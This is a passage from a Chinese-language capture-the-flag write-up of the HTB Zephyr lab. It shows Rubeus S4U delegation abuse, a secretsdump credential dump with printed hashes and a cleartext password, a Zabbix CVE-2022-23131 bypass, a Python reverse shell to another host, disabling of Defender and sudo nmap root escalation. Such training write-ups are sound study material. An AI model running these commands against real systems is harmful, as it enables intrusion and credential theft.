Group Name                           Type             SID          Attributes
==================================== ================ ============ ===============================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators               Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled
```

black是这台机器的管理员

拿下flag

ZEPHYR{7h3_Tru57_h45_B3eN_Br0k3n}

![image-20260714194331284](/images/htb-prolab/zephyr/20260715091448929.png)

- **DC 机器账户**被允许模拟任意用户去访问 **blake 配置的服务**
- 结合 blake 的 SPN `HTTP/dc.painters.htb` 和 `Delegation: constrained`

也就是说 **blake 可以模拟任意用户（包括 Administrator）请求到 DC 的 CIFS/LDAP/HTTP 服务票据**

```
# 上传 Rubeus
upload /root/Rubeus.exe R.exe
# 临时禁用实时监控
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true

# 先用 asktgt 拿到 TGT，再用 TGT 做 s4u
.\R.exe asktgt /user:blake /password:P@ssw0rd123! /domain:painters.htb /dc:dc.painters.htb /outfile:tgt.kirbi

.\R.exe s4u /user:blake /ticket:tgt.kirbi /impersonateuser:Administrator /msdsspn:cifs/dc.painters.htb /domain:painters.htb /dc:dc.painters.htb /ptt

# 把票据导出到文件，不回话注入
.\R.exe s4u /user:blake /ticket:tgt.kirbi /impersonateuser:Administrator /msdsspn:cifs/dc.painters.htb /domain:painters.htb /dc:dc.painters.htb /outfile:admin.kirbi



```



![image-20260715091459058](/images/htb-prolab/zephyr/20260715091459179.png)

```
download admin_cifs_dc.painters.htb.kirbi /root/dc.kirbi
```

```
# 检查文件大小
ls -la /root/dc.kirbi

# 转换格式
python3 ./ticketConverter.py /root/dc.kirbi /root/dc.ccache

# 重新导入
export KRB5CCNAME=/root/dc.ccache
proxychains python3 ./smbclient.py -k -no-pass painters.htb/Administrator@dc.painters.htb -target-ip 192.168.110.55
```

### ZEPHYR-PNTDC (.55)

进入smb shell

```
# 先选 C$ 共享
use C$
# 然后看文件
ls
# 进目录
cd Users\Administrator\Desktop
# 看文件
ls
# 下载 flag
get flag.txt
```

![image-20260715091517716](/images/htb-prolab/zephyr/20260715091517861.png)

ZEPHYR{P41n73r_D0m41n_D0m1n4nc3} 

```
┌──(root㉿kali)-[~/桌面/impacket-0.13.0/examples]
└─# # Kali 终端
cat flag.txt
ZEPHYR{P41n73r_D0m41n_D0m1n4nc3} 
```

接着

```
# 1. 先检查 /etc/hosts 有没有 painters.htb 的解析
echo "192.168.110.55 dc.painters.htb PAINTERS.HTB" >> /etc/hosts
# 强制指定 DC 的 IP
KRB5CCNAME=/root/dc.ccache proxychains python3 ./wmiexec.py -k -no-pass painters.htb/Administrator@dc.painters.htb -target-ip 192.168.110.55 -dc-ip 192.168.110.55
```

![image-20260714203340851](/images/htb-prolab/zephyr/20260721172303258.png)

secretsdump 通过卷影副本读取 NTDS，正在导出所有域用户哈希。等它出结果。

```
──(root㉿kali)-[~/桌面/impacket-0.13.0/examples]
└─# # 同样参数直接跑 secretsdump -use-vss
KRB5CCNAME=/root/dc.ccache proxychains python3 ./secretsdump.py -k -no-pass painters.htb/Administrator@dc.painters.htb -target-ip 192.168.110.55 -dc-ip 192.168.110.55 -just-dc -use-vss
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.110.55:445  ...  OK
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x26e642aeb927768190bf01f71ffcc079
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient

[*] PEK # 0 found and decrypted: 85d4589a3dd4fb78cbbea274f5d7c14d
[*] Reading and decrypting hashes from \\192.168.110.55\ADMIN$\Temp\GDSfVnUF.tmp 
^[[A^[[A^[[AAdministrator:500:aad3b435b51404eeaad3b435b51404ee:5bdd6a33efe43f0dc7e3b2435579aa53:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:5869ab656006ee71af41d437a6788093:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b59ffc1f7fcd615577dab8436d3988fc:::
PNT-SVRSVC$:1103:aad3b435b51404eeaad3b435b51404ee:c206d294c947cecc0e60955004ff96c5:::
PNT-SVRBPA$:1104:aad3b435b51404eeaad3b435b51404ee:2dfcebbe9f5f4cb3bf98032887b3d7b6:::
PNT-SVRPSB$:1105:aad3b435b51404eeaad3b435b51404ee:7fc6b6b4b44a96617b5829a888b5a85a:::
riley:1106:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
blake:1107:aad3b435b51404eeaad3b435b51404ee:e5d2642d8e3db51d855870729f0518cd:::
gavin:1108:aad3b435b51404eeaad3b435b51404ee:cb8ec920398da9fbb7c33b7b613b28d5:::
daniel:1109:aad3b435b51404eeaad3b435b51404ee:b084c663ad3f214e516e6f89c81c80d7:::
tom:1110:aad3b435b51404eeaad3b435b51404ee:dc51a409ab6cf835cbb9e471f27d8bc6:::
web_svc:1111:aad3b435b51404eeaad3b435b51404ee:502472f625746727fa99566032383067:::
MAINTENANCE$:2101:aad3b435b51404eeaad3b435b51404ee:6db918e3d0a23093360a17711ac9c59a:::
ZSM$:2102:aad3b435b51404eeaad3b435b51404ee:78b19983c904c66a6e350549e8caa00c:::
WORKSTATION-1$:2103:aad3b435b51404eeaad3b435b51404ee:9ab46ef513f6f74ddf1ab492b8f542fa:::
painters.htb\Matt:4101:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
[*] Kerberos keys from \\192.168.110.55\ADMIN$\Temp\GDSfVnUF.tmp 
Administrator:aes256-cts-hmac-sha1-96:d5d7a2fd36d4ede3aaf21537b504df92a32e2e70c37187efe42b6263897ead36
Administrator:aes128-cts-hmac-sha1-96:f6139559372a236bde1524329d2aa492
Administrator:des-cbc-md5:807c2a64b3c8b379
DC$:aes256-cts-hmac-sha1-96:3ed6c9f397b46b39a4099ef6ffb834168f1b7abedde82561cee74d3f2cfb1f73
DC$:aes128-cts-hmac-sha1-96:c26f7ec4b891b19151704ac3a45ae0fe
DC$:des-cbc-md5:5e3b4cb002b3f289
krbtgt:aes256-cts-hmac-sha1-96:39610acedf7a66db295ee28263e7ad75234ae7884dbde20a4890bf97f7b8872b
krbtgt:aes128-cts-hmac-sha1-96:9a6c9880f96f75edd17f648206fb5abd
krbtgt:des-cbc-md5:25f2432654101f40
PNT-SVRSVC$:aes256-cts-hmac-sha1-96:a31b4a0de42a441e47dad46f283105a9eeaf023831336cf2b2933c2907a63c4a
PNT-SVRSVC$:aes128-cts-hmac-sha1-96:0f5239792536fef683f21de1925b8ca4
PNT-SVRSVC$:des-cbc-md5:0db9624308c7c76b
PNT-SVRBPA$:aes256-cts-hmac-sha1-96:09f22fb6cd45a7a633854dcb861371f7af81676d336121d383c35328c127bee4
PNT-SVRBPA$:aes128-cts-hmac-sha1-96:a064d5c19ffd7dc845c31cbc9bbcc85d
PNT-SVRBPA$:des-cbc-md5:cdec8ff8e9041cb0
PNT-SVRPSB$:aes256-cts-hmac-sha1-96:543458b7a3d85c5f48438b5096ba4653e73ca7291b797691ee96368255ffbab6
PNT-SVRPSB$:aes128-cts-hmac-sha1-96:5db252e5f61efa9b6cfa4404ccc975e7
PNT-SVRPSB$:des-cbc-md5:29f78975e5f20b7f
riley:aes256-cts-hmac-sha1-96:2c9f84f81d7a76eb1f29193107fd2e51834962cc90cfcfafef7ab4baabe59360
riley:aes128-cts-hmac-sha1-96:bc65c97f9324894006a5e389ab91ccec
riley:des-cbc-md5:3e018f85012cc8b0
blake:aes256-cts-hmac-sha1-96:b4c8e03876cf31413d1e058e6edffe31c0d115f7f03503910301cdbbeebaddcd
blake:aes128-cts-hmac-sha1-96:07631ebaa340674ed7af1b1e70781820
blake:des-cbc-md5:b538ba0d3b4a043e
gavin:aes256-cts-hmac-sha1-96:fa583a1938a32986a2c23f7787aa2c3282b96259c89070a01a19e256b58f9992
gavin:aes128-cts-hmac-sha1-96:fbcae12c4967569b398868fb38f0b300
gavin:des-cbc-md5:b54f67f19d8ab367
daniel:aes256-cts-hmac-sha1-96:8bb18fd1df9c7eecfa5c4de65ca4fda6c37efc98a2c94ef8edf8a4e606bc6ffd
daniel:aes128-cts-hmac-sha1-96:ba81e1c1fb60c279aa5c685ede732c8e
daniel:des-cbc-md5:a7455b207f1570ad
tom:aes256-cts-hmac-sha1-96:657f8676662fc4f5ad5bca4c19f1576ff1ce200fa5418860a5483f99d0d05888
tom:aes128-cts-hmac-sha1-96:b1c6797bf5e899d09cf865d30470bb7c
tom:des-cbc-md5:2aea89cb23b6f246
web_svc:aes256-cts-hmac-sha1-96:bc2600db46b90a0deffc6a34f60f9574b82ede49e71d4cf337f11ddf290993d8
web_svc:aes128-cts-hmac-sha1-96:e9c960b6403d6aa5b6b79885e1cc11b0
web_svc:des-cbc-md5:e6b986ae31e34a20
MAINTENANCE$:aes256-cts-hmac-sha1-96:31846c6b8b5f7a6116d7e2e7a7f3d4b4f4eda46f6dda8e3170a340f387bdb56c
MAINTENANCE$:aes128-cts-hmac-sha1-96:ccb136a8d9d5eed3308a6c4a9a31fc8c
MAINTENANCE$:des-cbc-md5:eaadcb1fc4b0d334
ZSM$:aes256-cts-hmac-sha1-96:58f3fe129be779155815d4a94ad5268233ee42b20c61e8ea9e4d2ce8fdbc22b5
ZSM$:aes128-cts-hmac-sha1-96:dcef2532dfb818fb6f3d53a56fde846d
ZSM$:des-cbc-md5:fe76527f4c52b3ce
WORKSTATION-1$:aes256-cts-hmac-sha1-96:f65b04cc76d8dc57579d12a0b29b294f6fc25c947fbf7e5dde6c3639330f73c0
WORKSTATION-1$:aes128-cts-hmac-sha1-96:729c49ae39c12a40da4ffb2267366f87
WORKSTATION-1$:des-cbc-md5:f4e00e6bcbe35e62
painters.htb\Matt:aes256-cts-hmac-sha1-96:42656beb2852a473c35498f55fbe113d4d722bb2efb36b1689d9b1a60e9cfa03
painters.htb\Matt:aes128-cts-hmac-sha1-96:a79e61bd0ca1d5760d5178e6010af2f7
painters.htb\Matt:des-cbc-md5:624c3458945b4675
[*] ClearText password from \\192.168.110.55\ADMIN$\Temp\GDSfVnUF.tmp 
painters.htb\Matt:CLEARTEXT:L1f30f4Spr1ngCh1ck3n!
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

```

**域管 Administrator NTLM:** `5bdd6a33efe43f0dc7e3b2435579aa53`

- **Matt 明文密码**：`L1f30f4Spr1ngCh1ck3n!`（Web Server 管理员）
- **ZSM$ 机器账户**存在 → `ZSM` = `zsm.local`（另一个域的跨域信任账户）
- 有了 **krbtgt 哈希**，可以制作黄金票据

```
proxychains nxc winrm 192.168.110.55 -u Administrator -H '5bdd6a33efe43f0dc7e3b2435579aa53'
```

![image-20260715091530232](/images/htb-prolab/zephyr/20260715091530358.png)

```
proxychains -q evil-winrm -i 192.168.110.55 -u Administrator -H '5bdd6a33efe43f0dc7e3b2435579aa53'
```

![image-20260714204342720](/images/htb-prolab/zephyr/20260715091539594.png)

完整攻击链子如下

```
① MAIL 入口机
   └─ 恶意PDF → SMB钓鱼 → Responder抓hash → john破解
   └─ riley:P@ssw0rd → SSH登录
   └─ CVE-2026-41651 (Pack2TheRoot) → root提权
   └─ ssh -D 1080 代理进入内网

② WKST (.56) 
   └─ nmap 发现 5985 WinRM
   └─ riley 直接 WinRM 登录 → **Pwn3d!**
   └─ 找到 flag: ZEPHYR{PwN1nG_W17h_P4s5W0rd_R3U53}

③ PNT-SVRSVC (.52)
   └─ LDAP 枚举到 web_svc 有 SPN
   └─ 密码喷洒 → web_svc:!QAZ1qaz → **Pwn3d!**
   └─ 本地 SAM dump → 拿到 James 哈希

④ PNT-SVRBPA (.53)
   └─ James 哈希喷洒 → 同密码登录 → **Pwn3d!**
   └─ 提 SYSTEM → 获得 PNT-SVRBPA$ 机器账户哈希
   └─ BloodHound 分析 → PNT-SVRBPA$ 对 blake 有 ForceChangePassword

⑤ PNT-SVRPSB (.54)
   └─ 通过 schtasks /ru SYSTEM (机器账户身份) 改 blake 密码
   └─ blake:P@ssw0rd123! → WinRM 登录 → **Pwn3d!**
   └─ BloodHound → blake 有受约束委派 AllowedToDelegate

⑥ DC (.55) 域控 
   └─ Rubeus S4U2self + S4U2proxy → 模拟 Administrator
   └─ 拿到 CIFS/dc.painters.htb 服务票据
   └─ wmiexec 登录域控
   └─ secretsdump -use-vss → 导出全域哈希
   └─ Administrator:5bdd6a33efe43f0dc7e3b2435579aa53
```

获得

账号：Matt
明文：L1f30f4Spr1ngCh1ck3n!

Blake 当前 Hash

```
blake:1107:aad3b435b51404eeaad3b435b51404ee:e5d2642d8e3db51d855870729f0518cd:::
```

### 域内信息收集

```
# 当前域完整信息
Get-ADDomain
# 域林根信息（看林根域名，判断是否存在多域）
Get-ADForest
# 列出林中所有域
(Get-ADForest).Domains
# 列出林中所有站点
Get-ADForest | Select-Object Sites
```

![image-20260714210939508](/images/htb-prolab/zephyr/20260714210939812.png)

根据之前导入的哈希以及bloodhound分析，可以确认

![image-20260715091554337](/images/htb-prolab/zephyr/20260715091554454.png)

**ZSM$ 机器账户**存在 → `ZSM` = `zsm.local`（另一个域的跨域信任账户）

```
nslookup zsm.local
```

![image-20260715091625346](/images/htb-prolab/zephyr/20260715091625497.png)

发现域控上可以ping通该ip

开启代理

```
sshuttle -r riley@10.10.110.35 192.168.110.0/24 192.168.210.0/24
```

```
./fscan -h 192.168.210.0/24 -np -p 22,80,88,135,139,443,445,3389,5985,3306,1433,6379 -t 200 -o fscan_210.txt
```

| IP   | 机器名                                       | 关键端口           | 判断依据       |
| ---- | -------------------------------------------- | ------------------ | -------------- |
| .17  | **ZPH-SVRCHR.internal.zsm.local** → HR       |                    |                |
| .18  | **ZPH-SVRCSUP.internal.zsm.local** → SUPPORT |                    |                |
| .10  | **ZPH-SVRDC01** (ZSM DC)                     | 88, 445, 389, 5985 | 域控           |
| .11  | **MGMT**                                     | 22, 445, 5985      | 管理机         |
| .12  | **CA**                                       | 80, 445, 5985      | IIS (证书服务) |
| .13  | **ZABBIX**                                   | 443, 22            | Zabbix Web     |
| .14  | **ADFS**                                     | 80, 443, 445, 5985 | ADFS           |
| .15  | **SQL01**                                    | 445, 5985, 1433    | MS SQL         |
| .16  | **CDC** (INTERNAL DC)                        | 88, 445, 389, 5985 | 子域控         |
| .19  | **SQL02**                                    | 445, 5985, 1433    | MS SQL         |
| .1   | OPNsense                                     | 22, 80, 443        | 防火墙/路由器  |



ssh matt@painters.htb

L1f30f4Spr1ngCh1ck3n!

![image-20260715162405360](/images/htb-prolab/zephyr/20260715162412515.png)

发现matt是51的最高权限用户，接着打下一个域

192.168.210.13是web页面有443，访问一下看看

### ZEPHYR-ZABBIX(.13)

![image-20260715164028065](/images/htb-prolab/zephyr/20260715164028174.png)

[CVE-2022-23131_Zabbix登录绕过漏洞复现-腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/1954777)

#### cve-2022-23131

```
                                                                                                                                                           
┌──(root㉿kali)-[~/桌面]
└─# python3 cve-2022-23131.py https://192.168.210.13/ Admin
/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host '192.168.210.13'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
decode_payload: {"saml_data": {"username_attribute": "Admin"}, "sessionid": "0e11209b9fdc49976b0189a9d4fb76c8", "sign": "Kr8xwzk8JqxHa8qJ0zMh4Km8Uj+uSNua9UtRKWw21Fl5UNAu0Q/ZfD5wILFdY/TOImWSk0LxY5hdpWBZdl6Zqg=="}
zbx_signed_session: eyJzYW1sX2RhdGEiOiB7InVzZXJuYW1lX2F0dHJpYnV0ZSI6ICJBZG1pbiJ9LCAic2Vzc2lvbmlkIjogIjBlMTEyMDliOWZkYzQ5OTc2YjAxODlhOWQ0ZmI3NmM4IiwgInNpZ24iOiAiS3I4eHd6azhKcXhIYThxSjB6TWg0S204VWordVNOdWE5VXRSS1d3MjFGbDVVTkF1MFEvWmZENXdJTEZkWS9UT0ltV1NrMEx4WTVoZHBXQlpkbDZacWc9PSJ9
                                                                                                                                                           
┌──(root㉿kali)-[~/桌面]

```

通过cve进入setup界面



![image-20260715165721608](/images/htb-prolab/zephyr/20260715165721714.png)

![image-20260715170223627](/images/htb-prolab/zephyr/20260715170223749.png)

administrator登录

创建脚本

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.110.51",445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

![image-20260715194346224](/images/htb-prolab/zephyr/20260721172225996.png)

![image-20260715194411674](/images/htb-prolab/zephyr/20260721172216098.png)

```
root@mail:/home/matt# nc -lvnp 445
Listening on 0.0.0.0 445
Connection received on 192.168.210.13 60162
bash: cannot set terminal process group (25683): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@zephyr:/$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether a2:de:ad:76:7f:0d brd ff:ff:ff:ff:ff:ff
    inet 192.168.210.13/24 brd 192.168.210.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::a0de:adff:fe76:7f0d/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:a3:11:8f:2e brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
zabbix@zephyr:/$ 

```

![image-20260715194832741](/images/htb-prolab/zephyr/20260721172205768.png)

发现无需密码，可以用root身份直接执行nmap

#### suid 提权

```
ssh matt@painters.htb

L1f30f4Spr1ngCh1ck3n!
echo 'os.execute("/bin/sh")' > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

拿到flag

ZEPHYR{Abu51ng_d3f4ul7_Func710n4li7y_ftw}

![image-20260721172157002](/images/htb-prolab/zephyr/20260721172157271.png)

查看hash

```
cat /etc/shadow
root:$6$6f6giSmZBJf/.sxX$lxLJK6FwdiiKgWo593xCjV0yi2U29AU5d2v2tYLrnN8AoBKswgvSuQwKiUhSb3nEcDa4sbMTu2N/TRd304bgg0:19334:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
sshd:*:18389:0:99999:7:::
systemd-coredump:!!:18389::::::
lxd:!:18389::::::
usbmux:*:18822:0:99999:7:::
zabbix:!:19047:0:99999:7:::
Debian-snmp:!:19047:0:99999:7:::
mysql:!:19047:0:99999:7:::
fwupd-refresh:*:19325:0:99999:7:::
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
zabbix:x:113:118::/var/lib/zabbix/:/usr/sbin/nologin
Debian-snmp:x:114:119::/var/lib/snmp:/bin/false
mysql:x:115:120:MySQL Server,,,:/nonexistent:/bin/false
fwupd-refresh:x:116:121:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin

```



```
uname -a
cat /etc/os-release 2>/dev/null || cat /etc/*-release
hostname
cat /proc/version
```

python3 -c 'import pty; pty.spawn("/bin/bash")'



查看端口服务

```
root@zephyr:/# ss -tlnp
ss -tlnp
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                                                         
LISTEN    0         50                 0.0.0.0:14330            0.0.0.0:*        users:(("python3",pid=8535,fd=16))                                             
LISTEN    0         511                0.0.0.0:443              0.0.0.0:*        users:(("nginx",pid=872,fd=6),("nginx",pid=871,fd=6),("nginx",pid=870,fd=6))   
LISTEN    0         50                 0.0.0.0:15517            0.0.0.0:*        users:(("python3",pid=8535,fd=6))                                              
LISTEN    0         50                 0.0.0.0:15518            0.0.0.0:*        users:(("python3",pid=8535,fd=10))                                             
LISTEN    0         50                 0.0.0.0:15519            0.0.0.0:*        users:(("python3",pid=8535,fd=14))                                             
LISTEN    0         4096               0.0.0.0:10050            0.0.0.0:*        users:(("zabbix_agentd",pid=859,fd=4),("zabbix_agentd",pid=858,fd=4),("zabbix_agentd",pid=857,fd=4),("zabbix_agentd",pid=856,fd=4),("zabbix_agentd",pid=855,fd=4),("zabbix_agentd",pid=848,fd=4))
LISTEN    0         4096               0.0.0.0:10051            0.0.0.0:*        users:(("zabbix_server",pid=1269,fd=4),("zabbix_server",pid=1268,fd=4),("zabbix_server",pid=1267,fd=4),("zabbix_server",pid=1266,fd=4),("zabbix_server",pid=1265,fd=4),("zabbix_server",pid=1264,fd=4),("zabbix_server",pid=1263,fd=4),("zabbix_server",pid=1262,fd=4),("zabbix_server",pid=1261,fd=4),("zabbix_server",pid=1260,fd=4),("zabbix_server",pid=1259,fd=4),("zabbix_server",pid=1258,fd=4),("zabbix_server",pid=1257,fd=4),("zabbix_server",pid=1256,fd=4),("zabbix_server",pid=1245,fd=4),("zabbix_server",pid=1244,fd=4),("zabbix_server",pid=1243,fd=4),("zabbix_server",pid=1242,fd=4),("zabbix_server",pid=1241,fd=4),("zabbix_server",pid=1240,fd=4),("zabbix_server",pid=1239,fd=4),("zabbix_server",pid=1238,fd=4),("zabbix_server",pid=1237,fd=4),("zabbix_server",pid=1236,fd=4),("zabbix_server",pid=1235,fd=4),("zabbix_server",pid=1234,fd=4),("zabbix_server",pid=1233,fd=4),("zabbix_server",pid=1232,fd=4),("zabbix_server",pid=1231,fd=4),("zabbix_server",pid=1230,fd=4),("zabbix_server",pid=1229,fd=4),("zabbix_server",pid=1228,fd=4),("zabbix_server",pid=1227,fd=4),("zabbix_server",pid=1226,fd=4),("zabbix_server",pid=1225,fd=4),("zabbix_server",pid=1224,fd=4),("zabbix_server",pid=1223,fd=4),("zabbix_server",pid=1222,fd=4),("zabbix_server",pid=1221,fd=4),("zabbix_server",pid=1220,fd=4),("zabbix_server",pid=1219,fd=4),("zabbix_server",pid=1218,fd=4),("zabbix_server",pid=1217,fd=4),("zabbix_server",pid=868,fd=4))
LISTEN    0         70               127.0.0.1:33060            0.0.0.0:*        users:(("mysqld",pid=958,fd=21))                                               
LISTEN    0         151              127.0.0.1:3306             0.0.0.0:*        users:(("mysqld",pid=958,fd=37))                                               
LISTEN    0         50                 0.0.0.0:14517            0.0.0.0:*        users:(("python3",pid=8535,fd=4))                                              
LISTEN    0         4096         127.0.0.53%lo:53               0.0.0.0:*        users:(("systemd-resolve",pid=638,fd=13))                                      
LISTEN    0         50                 0.0.0.0:14518            0.0.0.0:*        users:(("python3",pid=8535,fd=8))                                              
LISTEN    0         128                0.0.0.0:22               0.0.0.0:*        users:(("sshd",pid=834,fd=3))                                                  
LISTEN    0         50                 0.0.0.0:14519            0.0.0.0:*        users:(("python3",pid=8535,fd=12))                                             
LISTEN    0         511                   [::]:443                 [::]:*        users:(("nginx",pid=872,fd=7),("nginx",pid=871,fd=7),("nginx",pid=870,fd=7))   
LISTEN    0         4096                  [::]:10050               [::]:*        users:(("zabbix_agentd",pid=859,fd=5),("zabbix_agentd",pid=858,fd=5),("zabbix_agentd",pid=857,fd=5),("zabbix_agentd",pid=856,fd=5),("zabbix_agentd",pid=855,fd=5),("zabbix_agentd",pid=848,fd=5))
